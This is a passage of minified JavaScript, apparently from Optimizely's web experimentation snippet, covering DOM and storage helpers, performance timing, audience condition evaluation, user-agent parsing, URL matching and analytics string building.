        }, t.addReadyHandler = function (n) {
          return document.addEventListener("DOMContentLoaded", n), function () {
            t.removeReadyHandler(n);
          };
        }, t.removeReadyHandler = function (n) {
          return function () {
            document.removeEventListener("DOMContentLoaded", n);
          };
        }, t.getReferrer = function () {
          return document.referrer;
        }, t.getReadyState = function () {
          return document.readyState;
        }, t.write = function (n) {
          if ("loading" !== t.getReadyState()) throw new Error("Aborting attempt to write to already-loaded document");
          document.write(n);
        }, t.appendToHead = function (n) {
          return t.appendTo(document.head, n);
        }, t.appendTo = function (n, t) {
          n.appendChild(t);
        }, t.addEventListener = function (n, t, e) {
          return document.addEventListener(n, t, e), function () {
            document.removeEventListener(n, t, e);
          };
        }, t.getCurrentScript = function () {
          if (document.currentScript) return document.currentScript;
        }, t.parentElement = function (n) {
          for (var t = n.parentNode; t.nodeType !== Node.ELEMENT_NODE;) t = t.parentNode;
          return t;
        };
      },
      4243: function (n, t, e) {
        var i,
          r,
          o = "optimizely_data",
          a = e(6639).U,
          u = e(147),
          c = e(2188),
          s = a("StorageError");
        try {
          r = c.getGlobal("localStorage");
        } catch (f) {
          throw new s("Unable to read localStorage: " + f.toString());
        }
        if (!r) throw new s("localStorage is undefined");
        i = u.create(r, o), t.mM = i;
      },
      7174: function (n, t) {
        t.create = function (n) {
          return new MutationObserver(n);
        }, t.observe = function (n, t, e) {
          n.observe(t, e);
        };
      },
      7170: function (n, t, e) {
        var i = e(8398).Promise,
          r = e(2188);
        t.estimateStorage = function () {
          var n = r.getGlobal("navigator");
          try {
            return n.storage.estimate();
          } catch (t) {
            return i.resolve({
              usage: null,
              quota: null
            });
          }
        };
      },
      9e3: function (n, t, e) {
        var i = e(2805),
          r = e(6639).U,
          o = e(3792),
          a = e(4797),
          u = e(2188),
          c = e(4041).get("stores/rum"),
          s = "optimizely:",
          f = t.Error = r("PerformanceError");
        function l() {
          return u.getGlobal("performance");
        }
        t.time = function (n) {
          if (c.getSampleRum()) {
            var t = l();
            if (t && t.mark) {
              var e = s + n;
              t.clearMarks(e + "Begin"), t.mark(e + "Begin");
            }
          }
        }, t.timeEnd = function (n) {
          if (c.getSampleRum()) {
            var t = l();
            if (t && t.mark) {
              var e = s + n,
                r = t.getEntriesByName(e + "Begin");
              if (0 === r.length) throw new f("Called timeEnd without matching time: " + n);
              t.clearMarks(e + "End"), t.mark(e + "End");
              var o = n + "Time",
                u = t.getEntriesByName(e + "End")[0].startTime - r[0].startTime;
              a.dispatch(i.SET_PERFORMANCE_MARKS_DATA, {
                name: o,
                data: {
                  startTime: Math.round(1e3 * r[0].startTime) / 1e3,
                  duration: Math.round(1e3 * u) / 1e3
                }
              });
            }
          }
        }, t.setMark = function (n, t, e) {
          if (c.getSampleRum()) {
            var r = l();
            if (r && r.mark) {
              var o = s + n;
              r.mark(o), a.dispatch(i.SET_PERFORMANCE_MARKS_DATA, {
                name: n,
                data: {
                  startTime: Math.round(1e3 * t) / 1e3,
                  duration: Math.round(1e3 * e) / 1e3
                }
              });
            }
          }
        }, t.now = function () {
          var n = l();
          return n ? n.now() : o.now();
        };
      },
      2188: function (n, t, e) {
        var i = e(9576),
          r = e(2678);
        t.getUserAgent = function () {
          return window.navigator.userAgent;
        }, t.getLocationSearch = function () {
          return window.location.search;
        }, t.getNavigatorLanguage = function () {
          return window.navigator.language || window.navigator.userLanguage;
        }, t.getHref = function () {
          return window.location.href;
        }, t.getLocation = function () {
          return window.location;
        }, t.setLocation = function (n) {
          window.location.replace(n);
        }, t.setGlobal = function (n, t) {
          window[n] = t;
        }, t.getGlobal = function (n) {
          return window[n];
        }, t.getGlobalByPath = function (n) {
          for (var t = n.split("."), e = window; t.length;) try {
            e = e[t.shift()];
          } catch (i) {
            throw r.error("Attempted to access nonexistent property. Path ", n), new Error("Attempted to access nonexistent property. Path " + n);
          }
          return e;
        }, t.addEventListener = function () {
          return window.addEventListener.apply(window, arguments);
        }, t.removeEventListener = function () {
          return window.removeEventListener.apply(window, arguments);
        }, t.isMutationObserverAPISupported = function () {
          return !i.isUndefined(window.MutationObserver);
        }, t.alert = function (n) {
          alert(n);
        }, t.setTimeout = function (n, t) {
          return setTimeout(function () {
            try {
              n();
            } catch (t) {
              r.warn("Deferred function threw error:", t);
            }
          }, t);
        }, t.setInterval = function (n, t) {
          return setInterval(function () {
            try {
              n();
            } catch (t) {
              r.warn("Polling function threw error:", t);
            }
          }, t);
        };
      },
      2474: function (n, t, e) {
        var i = e(9576);
        t.create = function (n, t, e, r) {
          return i.extend({
            category: "other"
          }, r, {
            id: n,
            apiName: t,
            eventType: e
          });
        };
      },
      4658: function (n, t, e) {
        var i = e(9576),
          r = e(1243),
          o = e(2805),
          a = e(7989),
          u = e(4041),
          c = e(4797),
          s = e(2678),
          f = u.get("stores/event_emitter");
        t.on = function (n) {
          return n.token || (n.token = r.generate()), c.dispatch(o.ADD_EMITTER_HANDLER, n), n.token;
        }, t.off = function (n) {
          c.dispatch(o.REMOVE_EMITTER_HANDLER, {
            token: n
          });
        }, t.emit = function (n, t, e) {
          var r = f.getHandlers(n, t);
          i.each(r, function (i) {
            try {
              i.handler.call({
                $di: u
              }, n);
            } catch (r) {
              !e && i.emitErrors ? (s.error("Error in handler for event:", n, r), a.emitError(r, null, t)) : s.warn("Suppressed error in handler for event:", n, r);
            }
          });
        };
      },
      9799: function (n, t, e) {
        var i = e(4658);
        t.on = function (n) {
          return n.publicOnly = !0, i.on(n);
        }, t.off = i.off, t.emit = function (n) {
          i.emit(n);
        };
      },
      9404: function (__unused_webpack_module, exports, __webpack_require__) {
        var createError = __webpack_require__(3491),
          di = __webpack_require__(4041),
          Logger = __webpack_require__(2678),
          CSP_MODE = !1,
          EXEC_WITH_JQUERY = !0,
          ExecError = exports.Error = createError("ExecError");
        exports.apply = function (n, t) {
          t = t || [], EXEC_WITH_JQUERY && (t = t.concat(di.get("env/jquery")));
          try {
            return n.apply(void 0, t);
          } catch (e) {
            throw Logger.warn("Error applying function", n, "with args:", t, e), new ExecError(e);
          }
        }, exports.eval = function (str) {
          if (CSP_MODE) throw new ExecError("eval is not supported in CSP mode");
          try {
            return EXEC_WITH_JQUERY && (str = "var $ = optimizely.get('jquery');" + str), eval(str);
          } catch (e) {
            throw Logger.warn("Error executing JS:", str, e), new ExecError(e);
          }
        };
      },
      4797: function (n, t, e) {
        var i = e(8394);
        n.exports = i.create();
      },
      1722: function (n, t, e) {
        var i = e(9576);
        t.description = function (n) {
          var t = !!n.name ? '"' + n.name + '" ' : "",
            e = function (n) {
              return i.map(n.weightDistributions, "entityId");
            }(n).join(", ");
          return t + "(id " + n.id + ", campaigns: " + e + ")";
        };
      },
      4604: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3792),
          a = e(4041),
          u = e(4797),
          c = a.get("stores/global"),
          s = a.get("stores/session");
        t.recordLayerDecision = function (n, t, e) {
          return u.dispatch(r.RECORD_LAYER_DECISION, {
            layerId: n,
            decision: e,
            decisionTicket: t,
            sessionId: s.getSessionId(),
            activationId: c.getActivationId(),
            timestamp: o.now(),
            revision: c.getRevision(),
            namespace: c.getNamespace(),
            pageId: t.pageId
          }), e;
        }, t.relatedAudienceIds = function (n) {
          var t = {},
            e = ["and", "or", "not"];
          return i.each(n.experiments, function (n) {
            i.each(i.flattenDeep(n.audienceIds), function (n) {
              i.includes(e, n) || (t[n] = !0);
            });
          }), i.keys(t);
        }, t.getActivationTimeout = function (n) {
          var t = n.activation;
          return t && null !== t.timeout && void 0 !== t.timeout ? t.timeout : 2e3;
        }, t.description = function (n) {
          return (n.name ? '"' + n.name + '" ' : "") + "(" + n.id + ")";
        }, t.createSingle = function (n, t, e) {
          return {
            id: n,
            policy: "single_experiment",
            holdback: 0,
            experiments: [{
              id: t || "",
              variations: [{
                id: e || "",
                actions: []
              }],
              audienceIds: []
            }],
            integrationStringVersion: 1
          };
        }, t.createLayerState = function (n, t, e, i) {
          return void 0 === i && (i = !1), {
            layerId: n,
            decision: {
              layerId: n,
              experimentId: t,
              variationId: e,
              isLayerHoldback: i || !1
            },
            decisionTicket: {
              audienceIds: []
            }
          };
        }, t.getIntegrationTypes = function (n) {
          return i.keys(i.reduce(i.keys(n.integrationSettings), function (n, t) {
            return i.isNaN(Number(t)) || (t = "custom"), n[t] = 1, n;
          }, {}));
        };
      },
      4364: function (n, t, e) {
        var i = e(9576);
        t.y = function (n, t) {
          if (!t) return 0;
          for (var e = t.toString().split("."), r = n.toString().split("."), o = 0; o < e.length; o++) {
            if (i.isUndefined(r[o])) return -1;
            if (isNaN(Number(r[o]))) {
              if (r[o] !== e[o]) return -1;
            } else {
              if (Number(r[o]) < Number(e[o])) return -1;
              if (Number(r[o]) > Number(e[o])) return 1;
            }
          }
          return 0;
        };
      },
      6227: function (n, t, e) {
        var i = e(9576),
          r = e(2676),
          o = e(2678),
          a = "or",
          u = "not";
        var c = {};
        function s(n, t) {
          var e;
          if (i.isArray(n)) {
            var u, s;
            n[0] in c ? (u = n[0], s = n.slice(1)) : (u = a, s = n), o.groupCollapsed('Condition / Applying operator "' + u + '" with args', r.stringify(s));
            try {
              e = c[u](s, t), o.debug("Condition / Result:", e);
            } finally {
              o.groupEnd();
            }
            return e;
          }
          return e = t(n), o.debug("Condition / Evaluated:", r.stringify(n), ":", e), e;
        }
        c["and"] = function (n, t) {
          for (var e, r, o = 0; o < n.length; o++) {
            if (!1 === (e = s(n[o], t))) return !1;
            i.isUndefined(e) && (r = !0);
          }
          if (!r) return !0;
        }, c[a] = function (n, t) {
          for (var e, r = !1, o = 0; o < n.length; o++) {
            if (!0 === (e = s(n[o], t))) return !0;
            i.isUndefined(e) && (r = !0);
          }
          if (!r) return !1;
        }, c[u] = function (n, t) {
          if (1 !== n.length) return !1;
          var e = s(n[0], t);
          return i.isUndefined(e) ? void 0 : !e;
        }, n.exports = {
          evaluate: s
        };
      },
      7051: function (n, t, e) {
        var i = e(9576),
          r = e(1284);
        function o(n) {
          if ((n = (n || "").toLowerCase()) in c) return n;
          var t = i.keys(c);
          return i.find(t, function (t) {
            var e = c[t];
            return i.includes(e, n);
          }) || "unknown";
        }
        function a(n, t, e) {
          return t || ("unknown" === n ? "unknown" : e ? "mobile" : "desktop_laptop");
        }
        t.parseUA = function (n) {
          var t = new r(n),
            e = t.getBrowser(),
            i = t.getOS(),
            c = t.getDevice(),
            f = (i.name || "unknown").toLowerCase(),
            l = (e.name || "unknown").toLowerCase(),
            d = u(c.type, l, f);
          return {
            browser: {
              id: o(e.name),
              version: e.version
            },
            platform: {
              name: f,
              version: i.version
            },
            device: {
              model: s[c.model] || "unknown",
              type: a(l, c.type, d),
              isMobile: d
            }
          };
        };
        var u = function (n, t, e) {
            if (i.includes(["mobile", "tablet"], n) || i.includes(["opera mini"], t)) return !0;
            return !!i.includes(["android", "blackberry", "ios", "windows phone"], e);
          },
          c = {
            gc: ["chrome", "chromium", "silk", "yandex", "maxthon", "chrome webview"],
            edge: ["edge"],
            ie: ["internet explorer", "iemobile"],
            ff: ["firefox", "iceweasel"],
            opera: ["opera", "opera mini", "opera tablet"],
            safari: ["safari", "mobile safari", "webkit"],
            ucbrowser: ["uc browser"]
          },
          s = {
            iPhone: "iphone",
            iPad: "ipad"
          };
      },
      5179: function (n, t, e) {
        var i = e(9576);
        function r() {
          this.q = {};
        }
        r.prototype.register = function (n, t) {
          if (1 !== arguments.length) {
            if (this.q[n]) throw new Error("Module already registered for: " + n);
            this.q[n] = t;
          } else {
            var e = this;
            i.each(n, function (n, t) {
              e.register(t, n);
            });
          }
        }, r.prototype.get = function (n) {
          return this.q[n];
        }, r.prototype.getModuleKeys = function () {
          var n = this.q;
          return i.keys(n);
        }, r.prototype.evaluate = function (n) {
          var t = n.length,
            e = n.slice(0, t - 1),
            r = n[t - 1];
          if ("function" != typeof r) throw new Error("Evaluate must take a function as last element in array");
          var o = i.map(e, i.bind(this.get, this));
          return r.apply(null, o);
        }, r.prototype.reset = function () {
          this.q = {};
        }, n.exports = {
          create: function () {
            return new r();
          }
        };
      },
      4811: function (n, t, e) {
        var i = e(9576);
        function r(n, t, e) {
          this.H = n, this.Y = t, this.K = 0, this.$ = !1, this.W = {}, i.extend(this, e), this.X = {}, this.initialize && this.initialize();
        }
        r.prototype.J = function (n, t) {
          var e = this.W[n];
          e && "function" == typeof e && e.call(this, t, n);
        }, r.prototype.Z = function () {
          return i.cloneDeep(this.X);
        }, r.prototype.on = function (n, t) {
          this.W[n] = i.bind(t, this);
        }, r.prototype.observe = function (n) {
          return this.Y.nn(this.H, n);
        }, r.prototype.emitChange = function () {
          this.$ = !0, this.K++;
        }, r.prototype.hasChanges = function () {
          return this.$;
        }, r.prototype.resetChange = function () {
          this.$ = !1;
        }, r.prototype.getStateId = function () {
          return this.K;
        }, r.prototype.tn = function () {
          this.reset && "function" == typeof this.reset && this.reset(), this.initialize();
        }, n.exports = r;
      },
      8394: function (n, t, e) {
        var i = e(9576),
          r = e(4811);
        function o(n) {
          n = n || {}, this.en = {}, this.rn = {}, this.an = 0, this.un = [], this.cn = [];
        }
        function a(n, t) {
          return function () {
            var e = n.indexOf(t);
            -1 !== e && n.splice(e, 1);
          };
        }
        o.prototype.registerStores = function (n) {
          i.forOwn(n, i.bind(function (n, t) {
            this.en[t] = new r(t, this, n);
          }, this));
        }, o.prototype.getStore = function (n) {
          return this.en[n];
        }, o.prototype.dispatch = function (n, t) {
          this.dispatchId++, i.each(this.un, i.bind(function (e) {
            e.call(this, n, t);
          }, this)), i.forOwn(this.en, function (e) {
            e.J(n, t);
          }), i.each(this.cn, i.bind(function (e) {
            e.call(this, n, t);
          }, this)), i.forOwn(this.en, i.bind(function (n, t) {
            n.hasChanges() && this.rn[t] && (n.resetChange(), i.each(this.rn[t], function (t) {
              t(n);
            }));
          }, this));
        }, o.prototype.reset = function () {
          this.rn = {}, i.forOwn(this.en, function (n, t) {
            n.tn();
          });
        }, o.prototype.getState = function () {
          var n = {};
          return i.forOwn(this.en, function (t, e) {
            n[e] = t.Z();
          }), n;
        }, o.prototype.onPreAction = function (n) {
          var t = this.un;
          return t.push(n), a(t, n);
        }, o.prototype.onPostAction = function (n) {
          var t = this.cn;
          return t.push(n), a(t, n);
        }, o.prototype.nn = function (n, t) {
          return this.rn[n] || (this.rn[n] = []), this.rn[n].push(t), a(this.rn[n], t);
        }, n.exports = {
          create: function (n) {
            return new o(n);
          }
        };
      },
      2676: function (n, t, e) {
        var i = e(9576);
        function r(n) {
          var t,
            e,
            r = [Array.prototype],
            o = [];
          i.each(r, function (n) {
            i.isUndefined(n.toJSON) || (o.push(n.toJSON), delete n.toJSON);
          });
          try {
            t = n();
          } catch (a) {
            e = a;
          } finally {
            i.each(o, function (n, t) {
              r[t].toJSON = n;
            });
          }
          if (e) throw e;
          return t;
        }
        t.stringify = function () {
          return r(i.bind(function () {
            return JSON.stringify.apply(null, this);
          }, arguments));
        }, t.parse = JSON.parse;
      },
      6061: function (n, t, e) {
        var i = e(9576);
        t.hasMatch = function (n, t, e) {
          var r = !i.isUndefined(e) && null !== e,
            o = !i.isUndefined(n) && null !== n;
          switch (t || (o ? "exact" : "exists")) {
            case "exists":
              return r;
            case "exact":
              return r && String(e) === n;
            case "substring":
              return r && String(e).indexOf(n) > -1;
            case "regex":
              try {
                return !(!o || !r) && new RegExp(n).test(String(e));
              } catch (f) {}
              return !1;
            case "range":
              var a = n.split(":"),
                u = parseFloat(a[0]),
                c = parseFloat(a[1]),
                s = parseFloat(e);
              return s >= u && s <= c;
            default:
              return !1;
          }
        };
      },
      8398: function (n, t, e) {
        n.exports = e(44);
      },
      147: function (n, t, e) {
        var i = e(9576),
          r = e(2678);
        function o(n, t) {
          this.sn = n, this.fn = t;
        }
        o.prototype.ln = function (n) {
          return [this.fn, n].join("$$");
        }, o.prototype.dn = function (n) {
          return n.replace(this.fn + "$$", "");
        }, o.prototype.setItem = function (n, t) {
          try {
            this.sn.setItem(this.ln(n), t);
          } catch (e) {
            r.warn("Failed to save", n, "to localStorage:", e);
          }
        }, o.prototype.removeItem = function (n) {
          this.sn.removeItem(this.ln(n));
        }, o.prototype.getItem = function (n) {
          var t = null;
          try {
            t = this.sn.getItem(this.ln(n));
          } catch (e) {}
          return t;
        }, o.prototype.keys = function () {
          var n = i.keys(this.sn);
          return i.map(i.filter(n, i.bind(function (n) {
            return i.includes(n, this.fn);
          }, this)), i.bind(this.dn, this));
        }, o.prototype.allKeys = function () {
          return i.keys(this.sn);
        }, o.prototype.allValues = function () {
          return i.values(this.sn);
        }, n.exports = {
          create: function (n, t) {
            return new o(n, t);
          },
          mockStorage: {
            keys: function () {},
            getItem: function (n) {},
            removeItem: function (n) {},
            setItem: function (n, t) {}
          }
        };
      },
      9328: function (n, t, e) {
        var i = e(6954),
          r = e(4658),
          o = e(7174);
        t.createDOMChangedObserver = function () {
          var n = i.getDocumentElement(),
            t = {
              type: "viewTrigger",
              name: "DOMChanged"
            },
            e = o.create(function () {
              r.emit(t, !0);
            });
          o.observe(e, n, {
            attributes: !0,
            childList: !0,
            subtree: !0,
            characterData: !0
          });
        };
      },
      1645: function (n, t, e) {
        var i = e(9576),
          r = e(7989),
          o = e(8964),
          a = e(2676),
          u = e(4243).mM,
          c = e(2678),
          s = e(3455),
          f = e(4041).get("stores/pending_events"),
          l = o.StorageKeys.PENDING_EVENTS;
        t.persistPendingEvents = function () {
          try {
            var n = f.getEventsString();
            u.setItem(l, n), e(7581).setItem(l, n);
          } catch (t) {
            c.warn("PendingEvents / Unable to set localStorage key, error was: ", t), r.emitInternalError(t);
          }
        }, t.getPendingEvents = function () {
          try {
            return a.parse(u.getItem(l));
          } catch (n) {
            return null;
          }
        }, t.retryPendingEvents = function (n) {
          i.forOwn(n, function (n, t) {
            s.retryableRequest(n.data, t, n.retryCount);
          }), i.isEmpty(n) || c.log("Retried pending events: ", n);
        };
      },
      2376: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(4041),
          a = e(8964),
          u = e(4658),
          c = e(4797);
        t.registerApiModule = function (n, t) {
          i.isArray(t) && (t = o.evaluate(t)), c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.apiModules,
            name: n,
            plugin: t
          });
        }, t.registerDependency = function (n, t) {
          o.get(n) || o.register(n, t);
        }, t.registerVisitorProfileProvider = function (n) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.visitorProfileProviders,
            name: n.provides,
            plugin: n
          });
        }, t.registerViewProvider = function (n) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.viewProviders,
            name: n.provides,
            plugin: n
          });
        }, t.registerAudienceMatcher = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.audienceMatchers,
            name: n,
            plugin: t
          });
        }, t.registerViewMatcher = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.viewMatchers,
            name: n,
            plugin: t
          });
        }, t.registerAnalyticsTracker = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.analyticsTrackers,
            name: n,
            plugin: t
          });
        }, t.registerViewTagLocator = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.viewTagLocators,
            name: n,
            plugin: t
          });
        }, t.registerAudiencePlugin = function (n) {
          n.dependencies && i.each(n.dependencies, function (n, e) {
            t.registerDependency(e, n);
          });
          var e,
            r,
            a = "vendor." + n.vendor;
          e = i.isString(n.provider) ? o.get(n.provider)(n.vendor) : i.isFunction(n.provider) ? n.provider(n.vendor) : i.cloneDeep(n.provider), t.registerVisitorProfileProvider(i.extend(e, {
            provides: a
          })), r = i.isString(n.matcher) ? o.get(n.matcher) : n.matcher;
          var u = {
            fieldsNeeded: [a],
            match: function (n, t) {
              return r(n[a], t);
            }
          };
          t.registerAudienceMatcher(a, u);
        }, t.registerWidget = function (n) {
          return i.isArray(n) && (n = o.evaluate(n)), {
            showToken: u.on({
              filter: {
                type: "showWidget",
                name: n.widgetId
              },
              handler: n.showFn
            }),
            hideToken: u.on({
              filter: {
                type: "hideWidget",
                name: n.widgetId
              },
              handler: n.hideFn
            })
          };
        }, t.registerChangeApplier = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.changeAppliers,
            name: n,
            plugin: t
          });
        }, t.registerDecider = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.deciders,
            name: n,
            plugin: t
          });
        }, t.registerEventImplementation = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.eventImplementations,
            name: n,
            plugin: t
          });
        }, t.registerViewTrigger = function (n, t) {
          c.dispatch(r.REGISTER_PLUGIN, {
            type: a.PluginTypes.viewTriggers,
            name: n,
            plugin: t
          });
        };
      },
      5850: function (n, t, e) {
        var i = e(9576),
          r = e(4041),
          o = ":",
          a = "holdback",
          u = "treatment",
          c = "",
          s = e(2678),
          f = e(2119);
        function l(n) {
          return n.replace(/[^a-zA-Z0-9\.\~\!\*\(\)\']+/g, "_");
        }
        t.formatNamesAndIdsForAnalytics = function (n, t, e, o) {
          var a = {
            layer: n.name || c,
            experiment: t.name || c,
            variation: e.name || c
          };
          o && (a = i.mapValues(a, l));
          var u,
            s = !n.integrationStringVersion || 1 === n.integrationStringVersion;
          if (a.experiment === c && s) if (u = t.audienceIds, !i.isEmpty(u) && i.includes(["and", "or", "not"], u[0])) a.experiment = "Exp";else {
            var f = r.get("stores/audience_data");
            a.experiment = function (n, t) {
              return i.isEmpty(t) ? "everyone_else" : i.reduce(t, function (t, e) {
                var i = n.get(e);
                return i ? t + l(i.name ? i.name : i.id) + "," : t;
              }, "").slice(0, -1);
            }(f, t.audienceIds);
          }
          return {
            names: a,
            idStrings: {
              layer: "(" + l(n.id) + ")",
              experiment: "(" + l(t.id) + ")",
              variation: "(" + l(e.id) + ")"
            }
          };
        }, t.combineAndTruncateIdAndName = function (n, t, e) {
          var i = e - t.length;
          if (i < 0 && (s.warn("maxLength must be at least long enough to fit the entity ID, which is length" + t.length + ". Defaulting to only use entity ID as name."), n = c), n === c) return t;
          if (n.length > i) {
            var r = Math.min(n.length, i);
            return (n = n.substring(0, r)) + t;
          }
          return n + " " + t;
        }, t.generateAnalyticsString = function (n, e, r, c, s, l) {
          return n.integrationStringVersion && 2 === n.integrationStringVersion ? function (n, e, r, u, c, s) {
            if (f.isSingleExperimentPolicy(n.policy) && u) return;
            var l = !f.isSingleExperimentPolicy(n.policy) && u,
              d = t.formatNamesAndIdsForAnalytics(n, e, r, s),
              v = [d.names.experiment, d.names.variation],
              h = [d.idStrings.experiment, d.idStrings.variation];
            f.isSingleExperimentPolicy(n.policy) || (v.unshift(d.names.layer), h.unshift(d.idStrings.layer));
            var p = i.reduce(h, function (n, t) {
                return n + t.length;
              }, 0),
              g = v.length - 1 + (l ? 1 : 0),
              m = p + g * o.length;
            if (l && (m += a.length), m > c) throw new Error("The analytics string size is too low to send the entity IDs.");
            for (var _ = c - m, w = v.length, y = [], b = v.length - 1; b >= 0; b--) {
              var E = v[b],
                I = Math.min(E.length, Math.floor(_ / w));
              _ -= I, w--, y.unshift(E.substring(0, I));
            }
            var A = i.map(y, function (n, t) {
              return n + h[t];
            });
            return l && A.push(a), A.join(o);
          }(n, e, r, c, s, l) : function (n, e, r, c, s, l) {
            var d = c ? a : u,
              v = 3 * o.length,
              h = t.formatNamesAndIdsForAnalytics(n, e, r, l),
              p = h.names,
              g = h.idStrings,
              m = i.reduce(g, function (n, t) {
                return n + t.length;
              }, 0);
            if (m + v + d.length > s) throw new Error("The analytics string size is too low to send the campaign, experiment, and variation IDs.");
            var _ = s - m - v - d.length,
              w = {};
            w.variation = Math.min(p.variation.length, Math.floor(_ / 3)), _ -= w.variation, w.experiment = Math.min(p.experiment.length, Math.floor(_ / 2)), _ -= w.experiment, w.layer = _;
            var y = {};
            i.each(p, function (n, t) {
              y[t] = n.substring(0, w[t]);
            });
            var b = [];
            return f.isSingleExperimentPolicy(n.policy) || b.push(y.layer + g.layer), (b = b.concat([y.experiment + g.experiment, y.variation + g.variation, d])).join(o);
          }(n, e, r, c, s, l);
        };
      },
      859: function (n, t, e) {
        var i = e(9576);
        n.exports = function (n, t) {
          n = function (n) {
            var t = n.split("?");
            if (t[1]) {
              var e = t[1].split("#"),
                r = e[0],
                a = e[1],
                u = r.split("&"),
                c = [];
              return i.each(u, function (n) {
                0 !== n.indexOf(o) && c.push(n);
              }), t[1] = "", c.length > 0 && (t[1] = "?" + c.join("&")), a && (t[1] += "#" + a), t.join("");
            }
            return n;
          }(n);
          var e = t.value;
          switch (t.match) {
            case "exact":
              return (n = c(n)) === c(e);
            case "regex":
              try {
                return Boolean(n.match(e));
              } catch (r) {}
              return !1;
            case "simple":
              return (n = u(n)) === (e = u(e));
            case "substring":
              return n = c(n, !0), e = c(e, !0), -1 !== n.indexOf(e);
            default:
              return !1;
          }
        };
        var r = ["www."],
          o = "optimizely_",
          a = ["https?://.*?.?optimizelyedit.(com|test)/", "https?://.*.?optimizelypreview.(com|test)/", "https?://(edit|preview)(-hrd|-devel)?.optimizely.(com|test)/", "https?://.*?.?optimizelyedit(-hrd)?.appspot.com/", "https?://"];
        function u(n) {
          return c(function (n) {
            var t = n.indexOf("?");
            return -1 !== t && (n = n.substring(0, t)), -1 !== (t = n.indexOf("#")) && (n = n.substring(0, t)), n;
          }(n));
        }
        function c(n, t) {
          n = (n = n.replace("/?", "?")).toLowerCase().replace(/[/&?]+$/, "");
          var e = a.slice(0);
          t || (e = e.concat(r));
          for (var i = e.length, o = 0; o < i; o++) {
            var u = e[o],
              c = new RegExp("^" + u);
            n = n.replace(c, "");
          }
          return n;
        }
      },
      1361: function (n, t, e) {
        var i = e(9576),
          r = e(9196).getFieldValue,
          o = e(6061);
        n.exports = function (n, t) {
          var e = r(n, t.name.split("."));
          return i.isArray(e) ? i.some(e, i.partial(o.hasMatch, t.value, t.match)) : o.hasMatch(t.value, t.match, e);
        };
      },
      2034: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694),
          a = e(2678);
        n.exports = {
          initialize: function () {
            this.X = {
              actions: {},
              actionState: {}
            }, this.on(r.DATA_LOADED, this.vn), this.on(r.ACTION_EXECUTED, this.hn), this.on(r.SET_CHANGE_APPLIER, this.pn), this.on(r.REMOVE_ACTION_STATE, this.gn);
          },
          vn: function (n) {
            var t = this;
            i.isEmpty(n.data.layers) || (i.each(n.data.layers, function (n) {
              var e;
              if (n.changes) {
                var r = "layerId:" + n.id;
                e = {
                  id: r,
                  layerId: n.id,
                  changeSet: n.changes,
                  type: "layer"
                }, o.deepFreeze(e), t.X.actions[r] = e;
              }
              i.each(n.experiments, function (r) {
                if (r.changes) {
                  var a = "experimentId:" + r.id;
                  e = {
                    id: a,
                    layerId: n.id,
                    experimentId: r.id,
                    changeSet: r.changes,
                    type: "experiment"
                  }, o.deepFreeze(e), t.X.actions[a] = e;
                }
                i.each(r.variations, function (a) {
                  i.each(a.actions, function (i) {
                    var u = i.pageId || i.viewId,
                      c = r.id + ":" + a.id + ":" + u;
                    e = {
                      id: c,
                      layerId: n.id,
                      experimentId: r.id,
                      variationId: a.id,
                      pageId: u,
                      changeSet: i.changes,
                      type: "variation"
                    }, o.deepFreeze(e), t.X.actions[c] = e;
                  });
                });
              });
            }), this.emitChange());
          },
          hn: function (n) {
            var t = n.actionId;
            i.isUndefined(t) || this.X.actionState[t] || (this.X.actionState[t] = {});
          },
          pn: function (n) {
            var t = n.actionId,
              e = n.changeId;
            this.X.actionState[t] ? this.X.actionState[t][e] = n.changeApplier : a.warn("Action Data / Attempted to set changeApplier for inactive action: ", t);
          },
          gn: function (n) {
            delete this.X.actionState[n.actionId];
          },
          get: function (n) {
            return o.safeReference(this.X.actions[n]);
          },
          getActionState: function (n) {
            return o.safeReference(this.X.actionState[n]);
          },
          getByChangeId: function (n) {
            return i.find(this.X.actions, {
              changeSet: [{
                id: n
              }]
            });
          },
          getAllActionIdsByPageId: function (n) {
            return i.map(i.filter(this.X.actions, {
              pageId: n
            }), "id");
          },
          getChangeApplier: function (n, t) {
            var e = this.X.actionState[t];
            if (e) return e[n];
          },
          getExperimentVariationActions: function (n, t) {
            return o.safeReference(i.filter(this.X.actions, {
              experimentId: n,
              variationId: t
            }));
          },
          getLayerActions: function (n) {
            return o.safeReference(i.filter(this.X.actions, {
              id: "layerId:" + n
            }));
          },
          getExperimentActions: function (n) {
            return o.safeReference(i.filter(this.X.actions, {
              id: "experimentId:" + n
            }));
          },
          getAll: function () {
            return o.safeReference(i.values(this.X.actions));
          }
        };
      },
      3685: function (n, t, e) {
        var i = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(i.REGISTER_ASYNC_DEFERRED, this.mn), this.on(i.RESOLVE_DEFERRED, this._n), this.on(i.REJECT_DEFERRED, this.wn);
          },
          getRequest: function (n) {
            return this.X[n];
          },
          getPromise: function (n) {
            var t = this.getRequest(n);
            if (t) return t.promise;
          },
          mn: function (n) {
            this.X[n.source] = {
              promise: n.promise,
              resolver: n.resolver,
              rejecter: n.rejecter
            };
          },
          _n: function (n) {
            var t = this.getRequest(n.source);
            if (!t) throw new Error("No request registered for source: " + n.source);
            t.resolver(n.resolveWith);
          },
          wn: function (n) {
            var t = this.getRequest(n.source);
            if (!t) throw new Error("No request registered for source: " + n.source);
            if (!t.rejecter) throw new Error("No rejecter registered for source: " + n.source);
            t.rejecter(n.rejectWith);
          }
        };
      },
      6330: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694);
        function a(n, t) {
          return t || (t = {}), n ? (i.each(n, function (n) {
